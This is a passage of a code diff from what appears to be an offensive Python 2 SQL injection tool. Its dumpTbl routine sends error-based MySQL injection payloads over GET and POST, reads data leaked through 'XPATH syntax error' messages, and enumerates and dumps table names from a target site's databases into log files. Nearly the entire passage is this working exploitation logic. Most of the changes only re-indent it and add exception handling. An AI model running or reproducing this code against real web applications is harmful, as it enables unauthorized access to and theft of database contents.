-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
-                                    # Query for dumping table
-                                    dbvul = False
-                                    for QueryIndex in TBL_DUMP_FROM_DBS:
-                                        if not dbvul:
-                                            #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
-                                            QueryToTest = QueryIndex % (db.encode('hex','strict'))
-                                            if '0x72306f74' in tempfread:
-                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
-                                                    try:
-                                                        respdata = resp.read()
-                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            dbvul = True
-                                                            DbDumpQuery = FinalCountQuery_replaced
-                                                            temp = 0
-                                                            noT = int(no_of_tbls)
-                                                            infos += "Database: %s\n" % db
-                                                            infos += "["+str(noT)+" tables]\n"
-                                                            #tmp = ""
-                                                            while temp < noT:
-                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                elif 'LIMIT%20' in DbDumpQuery:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
-                                                                else:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                print fw + sn + "Database: %s" % db
+                                                                print fw + sn + "["+str(noT)+" tables]"
+                                                                #print fw + sn + tmp
+                                                                tab = pt(["tables"])
+                                                                tab.align = "l"
+                                                                tab.header = False
+                                                                for tbl in dumps:
+                                                                    tab.add_row([tbl])
+                                                                    pass
+                                                                print fw + sn + str(tab) 
                                                                     
-                                                                try:
-                                                                    req = Request(tempQuery, headers={'User-agent':ua})
-                                                                    resp = urlopen(req, timeout=10)
-                                                                except URLError as e:
-                                                                    URLError()
-                                                                    if temp == 0:
-                                                                        temp = 0
-                                                                    else:
-                                                                        temp = temp
-                                                                    sleep(1)
-                                                                    pass
-                                                                except HTTPError as e:
-##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                    sleep(1)
-                                                                    pass
-                                                                except (IOError, httplib.HTTPException) as e:
-                                                                    ConnTimeOut()
-                                                                    if temp == 0:
-                                                                        temp = 0
-                                                                    else:
-                                                                        temp = temp
-                                                                    sleep(1)
-                                                                    pass
-                                                                except KeyboardInterrupt:
-                                                                    print fw + sn + "Database: %s" % db
-                                                                    print fw + sn + "[Dumped "+str(temp)+" tables]"
-                                                                    #print fw + sn + tmp
-                                                                    tab = pt(["tables"])
-                                                                    tab.align = "l"
-                                                                    tab.header = False
-                                                                    for tbl in dumps:
-                                                                        tab.add_row([tbl])
-                                                                        pass
-                                                                    print fw + sn + str(tab) 
-                                                                    f.write(infos)
-                                                                    f.write(str(tab)+"\n")
-                                                                    f.close()
-                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-                                                                    KeyBoardInterrupt()
-                                                                    break
-                                                                else:
-                                                                    try:
-                                                                        respdata = resp.read()
-                                                                        name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                        if 'XPATH syntax error' in respdata:
-                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
-                                                                            #infos += "[*] %s\n" % name_of_tbls
-                                                                            #tmp += "[*] %s\n" % name_of_tbls
-                                                                            dumps.append(name_of_tbls)
-                                                                            temp += 1
-                                                                            
-                                                                    except IndexError as e:
-                                                                        pass
-                                                                    except Exception as e:
-                                                                        #print '[-] %s' % e
-                                                                       # sys.exit(0)
-                                                                        pass
-                                                                    except KeyboardInterrupt:
-                                                                        KeyBoardInterrupt()
-                                                                        break
-                                                            print fw + sn + "Database: %s" % db
-                                                            print fw + sn + "["+str(noT)+" tables]"
-                                                            #print fw + sn + tmp
-                                                            tab = pt(["tables"])
-                                                            tab.align = "l"
-                                                            tab.header = False
-                                                            for tbl in dumps:
-                                                                tab.add_row([tbl])
-                                                                pass
-                                                            print fw + sn + str(tab) 
-                                                                
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        #print '[-] %s' % e
-                                                        #sys.exit(0)
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if dbvul:
-                                            break
-                                        # TBL DUMP END
-                            except IndexError as e:
-                                pass
-                            except Exception as e:
-                                #print '[-] %s' % e
-                                #sys.exit(0)
-                                pass
-                            except KeyboardInterrupt:
-                                KeyBoardInterrupt()
-                                break
-                if Query_Test:
-                    break
-            tempf.close()
-            f.write(infos)
-            f.write(str(tab)+"\n")
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-            infos = ""
+                                                        except IndexError as e:
+                                                            pass
+                                                        except Exception as e:
+                                                            #print '[-] %s' % e
+                                                            #sys.exit(0)
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                            if dbvul:
+                                                break
+                                            # TBL DUMP END
+                                except IndexError as e:
+                                    pass
+                                except Exception as e:
+                                    #print '[-] %s' % e
+                                    #sys.exit(0)
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break
+                    if Query_Test:
+                        break
+                tempf.close()
+                f.write(infos)
+                f.write(str(tab)+"\n")
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                infos = ""
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                pass
 #--------------------------------------------------------------------------------
 #                           POST DATA
 #--------------------------------------------------------------------------------            
@@ -3356,29 +3377,310 @@ def  dumpTbl(url, data, db):
         try:
             tempf = open(payload,'r')
         except (Exception, IOError) as e:
-            if 'No such file or directory' in e:
-                vul = False
-                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
-                    try:
-                        if not vul:
-                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
-                            if '*' in data:
-                                first, last = data.split('*')
-                                tgt = first + temp + last
-                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
-                            else:
-                                tgt = data + temp
+            try:
+                if 'No such file or directory' in e:
+                    vul = False
+                    for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
+                        try:
+                            if not vul:
+                                temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
+                                if '*' in data:
+                                    first, last = data.split('*')
+                                    tgt = first + temp + last
+                                    #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
+                                else:
+                                    tgt = data + temp
+                                try:
+                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
+                                    req = Request(url, data=tgt, headers={'User-agent':ua})
+                                    HTTPReqCount += 1
+                                    resp = urlopen(req, timeout=10)
+                                except URLError as e:
+                                    URLError()
+                                    sleep(1)
+                                    pass
+                                except HTTPError as e:
+    ##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                    sleep(1)
+                                    pass
+                                except (IOError, httplib.HTTPException) as e:
+                                    ConnTimeOut()
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break   
+                                else:
+                                    try:
+                                        respdata = resp.read()
+                                        retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                        if 'XPATH syntax error' in respdata:
+                                            vul = True
+                                            print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
+                                            infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                            print fw + sn + 'Parameter: (GET)'
+                                            infos += 'Parameter: (GET)\n'
+                                            print fw + sn + '\tType: error-based'
+                                            infos += '\tType: error-based\n'
+                                            print fw + sn + '\tTitle: %s' % test
+                                            infos += '\tTitle: %s\n' % test
+                                            print fw + sn + '\tPayload: %s' % tgt
+                                            infos += '\tPayload: %s\n' % tgt
+                                            # ----------------------------------------
+                                            # for later usage of dumiping other things
+                                            CreatePayloadFile()
+                                            with open(payload,'w') as ft:
+                                                ft.write('%s' % tgt)
+                                                ft.close()
+                                            # ----------------------------------------
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                        
+                                    except IndexError as e:
+                                        pass
+                                    except Exception as e:
+                                        #print '[-] %s' % e
+                                        pass
+                                    except KeyboardInterrupt:
+                                        KeyBoardInterrupt()
+                                        break
+                                    else:
+                                        Query_Test = False
+                                        if wsr and war:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                                            infos += "web server technology: %s, %s\n" % (war, wsr)
+                                        else:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                                            infos += "web server technology: %s\n" % wsr
+                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                                        infos += "the back-end DBMS: MySQL\n"
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
+                                        for QueryIndex in TBL_COUNT_FROM_DBS:
+                                            if not Query_Test:
+                                                QueryToTest = QueryIndex % (db.encode('hex','strict'))
+                                                if '0x72306f74' in tgt:
+                                                    FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                    try:
+                                                        req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
+                                                        resp = urlopen(req, timeout=10)
+                                                    except URLError as e:
+                                                        URLError()
+                                                        sleep(1)
+                                                        pass
+                                                    except HTTPError as e:
+    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                        sleep(1)
+                                                        pass
+                                                    except (IOError, httplib.HTTPException) as e:
+                                                        ConnTimeOut()
+                                                        pass
+                                                    except KeyboardInterrupt:
+                                                        KeyBoardInterrupt()
+                                                        break
+                                                    else:
+                                                        try:
+                                                            respdata = resp.read()
+                                                            no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            if 'XPATH syntax error' in respdata:
+                                                                Query_Test = True
+                                                                #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                                                if '0' in no_of_tbls:
+                                                                    print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                                                    break
+                                                                else:
+                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                                                dbvul = False
+                                                                for QueryIndex in TBL_DUMP_FROM_DBS:
+                                                                    if not dbvul:
+                                                                        QueryToTest = QueryIndex % (db.encode('hex','strict'))
+                                                                        if '0x72306f74' in tgt:
+                                                                            FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                                            try:
+                                                                                req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
+                                                                                resp = urlopen(req, timeout=10)
+                                                                            except URLError as e:
+                                                                                URLError()
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except HTTPError as e:
+    ##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                ConnTimeOut()
+                                                                                pass
+                                                                            except KeyboardInterrupt:
+                                                                                KeyBoardInterrupt()
+                                                                                break
+                                                                            else:
+                                                                                try:
+                                                                                    respdata = resp.read()
+                                                                                    isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                        dbvul = True
+                                                                                        DbDumpQuery = FinalDumpQuery_replaced
+                                                                                        temp = 0
+                                                                                        noT = int(no_of_tbls)
+                                                                                        infos += "Database: %s\n" % dbs
+                                                                                        infos += "["+str(noT)+" tables]\n"
+                                                                                        #tmp = ""
+                                                                                        while temp < noT:
+                                                                                            if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                                            elif 'LIMIT%20' in DbDumpQuery:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
+                                                                                            else:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+
+                                                                                            try:
+                                                                                                req = Request(url, data=tempQuery, headers={'User-agent':ua})
+                                                                                                resp = urlopen(req, timeout=10)
+                                                                                            except URLError as e:
+                                                                                                URLError()
+                                                                                                if temp == 0:
+                                                                                                    temp = 0
+                                                                                                else:
+                                                                                                    temp = temp
+                                                                                                sleep(1)
+                                                                                                pass
+                                                                                            except HTTPError as e:
+    ##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                                sleep(1)
+                                                                                                pass
+                                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                                ConnTimeOut()
+                                                                                                if temp == 0:
+                                                                                                    temp = 0
+                                                                                                else:
+                                                                                                    temp = temp
+                                                                                                pass
+                                                                                            except KeyboardInterrupt:
+                                                                                                print fg + sb + "Database: %s" % db
+                                                                                                print fg + sb + "[Dumped "+str(temp)+" tables]"
+                                                                                                #print fg + sb + tmp
+                                                                                                tab = pt(["tables"])
+                                                                                                tab.align = "l"
+                                                                                                tab.header = False
+                                                                                                for tbl in dumps:
+                                                                                                    tab.add_row([tbl])
+                                                                                                    pass
+                                                                                                print fg + sb + str(tab) 
+                                                                                                f.write(infos)
+                                                                                                f.write(str(tab)+"\n")
+                                                                                                f.close()
+                                                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                                                                                                KeyBoardInterrupt()
+                                                                                                break
+                                                                                            else:
+                                                                                                try:
+                                                                                                    respdata = resp.read()
+                                                                                                    name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
+                                                                                                        infos += "[*] %s\n" % name_of_tbls
+                                                                                                        tmp += "[*] %s\n" % name_of_tbls
+                                                                                                        dumps.append(name_of_tbls)
+                                                                                                        temp += 1
+                                                                                                        
+                                                                                                except IndexError as e:
+                                                                                                    pass
+                                                                                                except Exception as e:
+                                                                                                    #print '[-] %s' % e
+                                                                                                    #sys.exit(0)
+                                                                                                    pass
+                                                                                                except KeyboardInterrupt:
+                                                                                                    KeyBoardInterrupt()
+                                                                                                    break
+                                                                                        print fg + sb + "Database: %s" % db        
+                                                                                        print fg + sb + "["+str(noT)+" tables]"
+                                                                                        #print fg + sb + tmp
+                                                                                        tab = pt(["tables"])
+                                                                                        tab.align = "l"
+                                                                                        tab.header = False
+                                                                                        for tbl in dumps:
+                                                                                            tab.add_row([tbl])
+                                                                                            pass
+                                                                                        print fg + sn + str(tab) 
+                                                                                            
+                                                                                except IndexError as e:
+                                                                                    pass
+                                                                                except Exception as e:
+                                                                                    #print '[-] %s' % e
+                                                                                    #sys.exit(0)
+                                                                                    pass
+                                                                                except KeyboardInterrupt:
+                                                                                    KeyBoardInterrupt()
+                                                                                    break
+                                                                    if dbvul:
+                                                                        break
+                                                        except IndexError as e:
+                                                            pass
+                                                        except Exception as e:
+                                                            #print '[-] %s' % e
+                                                            #sys.exit(0)
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                            if Query_Test:
+                                                break            
+                            if vul:
+                                break
+                        except (TypeError, IOError, IndexError):
+                            pass
+                        except KeyboardInterrupt:
+                            KeyBoardInterrupt()
+                            break
+                        
+                f.write(infos)
+                f.write(str(tab)+"\n")
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                pass
+            
+        else:
+            try:
+                print fw + sn + "xpath resumed the following injection point(s) from stored session:"
+                infos += "\nxpath resumed the following injection point(s) from stored session:\n"
+                with open(logs, "r") as prev_session:
+                    for line in islice(prev_session,1,7):
+                        out = line.rstrip()
+                        if out:
+                            print fw + sn + out
+                            infos += out+"\n"
+                prev_session.close()
+                HTTPResponses(url, data)
+                Query_Test = False
+                tempfread = tempf.readline()
+                if wsr and war:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                    infos += "web server technology: %s, %s\n" % (war, wsr)
+                else:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                    infos += "web server technology: %s\n" % wsr
+                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                infos += "the back-end DBMS: MySQL\n"
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
+                for QueryIndex in TBL_COUNT_FROM_DBS:
+                    if not Query_Test:
+                       #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
+                        QueryToTest = QueryIndex % (db.encode('hex','strict'))
+                        if '0x72306f74' in tempfread:
+                            FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                             try:
-                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
-                                req = Request(url, data=tgt, headers={'User-agent':ua})
-                                HTTPReqCount += 1
+                                req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                 resp = urlopen(req, timeout=10)
                             except URLError as e:
                                 URLError()
                                 sleep(1)
                                 pass
                             except HTTPError as e:
-##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+    ##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                 sleep(1)
                                 pass
                             except (IOError, httplib.HTTPException) as e:
@@ -3386,428 +3688,165 @@ def  dumpTbl(url, data, db):
                                 pass
                             except KeyboardInterrupt:
                                 KeyBoardInterrupt()
-                                break   
+                                break
                             else:
                                 try:
                                     respdata = resp.read()
-                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                    no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                     if 'XPATH syntax error' in respdata:
-                                        vul = True
-                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
-                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                        print fw + sn + 'Parameter: (GET)'
-                                        infos += 'Parameter: (GET)\n'
-                                        print fw + sn + '\tType: error-based'
-                                        infos += '\tType: error-based\n'
-                                        print fw + sn + '\tTitle: %s' % test
-                                        infos += '\tTitle: %s\n' % test
-                                        print fw + sn + '\tPayload: %s' % tgt
-                                        infos += '\tPayload: %s\n' % tgt
-                                        # ----------------------------------------
-                                        # for later usage of dumiping other things
-                                        CreatePayloadFile()
-                                        with open(payload,'w') as ft:
-                                            ft.write('%s' % tgt)
-                                            ft.close()
-                                        # ----------------------------------------
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                    
-                                except IndexError as e:
-                                    pass
-                                except Exception as e:
-                                    #print '[-] %s' % e
-                                    pass
-                                except KeyboardInterrupt:
-                                    KeyBoardInterrupt()
-                                    break
-                                else:
-                                    Query_Test = False
-                                    if wsr and war:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                                        infos += "web server technology: %s, %s\n" % (war, wsr)
-                                    else:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                                        infos += "web server technology: %s\n" % wsr
-                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-                                    infos += "the back-end DBMS: MySQL\n"
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
-                                    for QueryIndex in TBL_COUNT_FROM_DBS:
-                                        if not Query_Test:
-                                            QueryToTest = QueryIndex % (db.encode('hex','strict'))
-                                            if '0x72306f74' in tgt:
-                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
+                                        Query_Test = True
+                                        #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                        if '0' in no_of_tbls:
+                                            print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                            break
+                                        else:
+                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                        dbvul = False
+                                        for QueryIndex in TBL_DUMP_FROM_DBS:
+                                            if not dbvul:
+                                                QueryToTest = QueryIndex % (db.encode('hex','strict'))
+                                                if '0x72306f74' in tempfread:
+                                                    FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                     try:
-                                                        respdata = resp.read()
-                                                        no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            Query_Test = True
-                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
-                                                            dbvul = False
-                                                            for QueryIndex in TBL_DUMP_FROM_DBS:
-                                                                if not dbvul:
-                                                                    QueryToTest = QueryIndex % (db.encode('hex','strict'))
-                                                                    if '0x72306f74' in tgt:
-                                                                        FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                        req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
+                                                        resp = urlopen(req, timeout=10)
+                                                    except URLError as e:
+                                                        URLError()
+                                                        sleep(1)
+                                                        pass
+                                                    except HTTPError as e:
+    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                        sleep(1)
+                                                        pass
+                                                    except (IOError, httplib.HTTPException) as e:
+                                                        ConnTimeOut()
+                                                        pass
+                                                    except KeyboardInterrupt:
+                                                        KeyBoardInterrupt()
+                                                        break
+                                                    else:
+                                                        try:
+                                                            respdata = resp.read()
+                                                            isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            if 'XPATH syntax error' in respdata:
+                                                                dbvul = True
+                                                                DbDumpQuery = FinalCountQuery_replaced
+                                                                temp = 0
+                                                                noT = int(no_of_tbls)
+                                                                infos += "Database: %s\n" % db
+                                                                infos += "["+str(noT)+" tables]\n"
+                                                                #tmp = ""
+                                                                while temp < noT:
+                                                                    if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                    elif 'LIMIT%20' in DbDumpQuery:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
+                                                                    else:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                    
+                                                                    try:
+                                                                        req = Request(url, data=tempQuery, headers={'User-agent':ua})
+                                                                        resp = urlopen(req, timeout=10)
+                                                                    except URLError as e:
+                                                                        URLError()
+                                                                        if temp==0:
+                                                                            temp=0
+                                                                        else:
+                                                                            temp = temp
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except HTTPError as e:
+    ##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except (IOError, httplib.HTTPException) as e:
+                                                                        ConnTimeOut()
+                                                                        if temp==0:
+                                                                            temp=0
+                                                                        else:
+                                                                            temp = temp
+                                                                        pass
+                                                                    except KeyboardInterrupt:
+                                                                        print fw + sn + "Database: %s"%db
+                                                                        print fw + sn + "[Dumped "+str(temp)+" tables]"
+                                                                        #print fw + sn + tmp
+                                                                        tab = pt(["tables"])
+                                                                        tab.align = "l"
+                                                                        tab.header = False
+                                                                        for tbl in dumps:
+                                                                            tab.add_row([tbl])
+                                                                            pass
+                                                                        print fw + sn + str(tab) 
+                                                                        f.write(infos)
+                                                                        f.write(str(tab)+"\n")
+                                                                        f.close()
+                                                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                                                                        KeyBoardInterrupt()
+                                                                        break
+                                                                    else:
                                                                         try:
-                                                                            req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
-                                                                            resp = urlopen(req, timeout=10)
-                                                                        except URLError as e:
-                                                                            URLError()
-                                                                            sleep(1)
+                                                                            respdata = resp.read()
+                                                                            name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                            if 'XPATH syntax error' in respdata:
+                                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
+                                                                                #infos += "[*] %s\n" % name_of_tbls
+                                                                                #tmp += "[*] %s\n" % name_of_tbls
+                                                                                dumps.append(name_of_tbls)
+                                                                                temp += 1
+                                                                                
+                                                                        except IndexError as e:
                                                                             pass
-                                                                        except HTTPError as e:
-##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                            sleep(1)
-                                                                            pass
-                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                            ConnTimeOut()
+                                                                        except Exception as e:
+                                                                            #print '[-] %s' % e
+                                                                            #sys.exit(0)
                                                                             pass
                                                                         except KeyboardInterrupt:
                                                                             KeyBoardInterrupt()
                                                                             break
-                                                                        else:
-                                                                            try:
-                                                                                respdata = resp.read()
-                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                if 'XPATH syntax error' in respdata:
-                                                                                    dbvul = True
-                                                                                    DbDumpQuery = FinalDumpQuery_replaced
-                                                                                    temp = 0
-                                                                                    noT = int(no_of_tbls)
-                                                                                    infos += "Database: %s\n" % dbs
-                                                                                    infos += "["+str(noT)+" tables]\n"
-                                                                                    #tmp = ""
-                                                                                    while temp < noT:
-                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                                        elif 'LIMIT%20' in DbDumpQuery:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
-                                                                                        else:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-
-                                                                                        try:
-                                                                                            req = Request(url, data=tempQuery, headers={'User-agent':ua})
-                                                                                            resp = urlopen(req, timeout=10)
-                                                                                        except URLError as e:
-                                                                                            URLError()
-                                                                                            if temp == 0:
-                                                                                                temp = 0
-                                                                                            else:
-                                                                                                temp = temp
-                                                                                            sleep(1)
-                                                                                            pass
-                                                                                        except HTTPError as e:
-##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                                            sleep(1)
-                                                                                            pass
-                                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                                            ConnTimeOut()
-                                                                                            if temp == 0:
-                                                                                                temp = 0
-                                                                                            else:
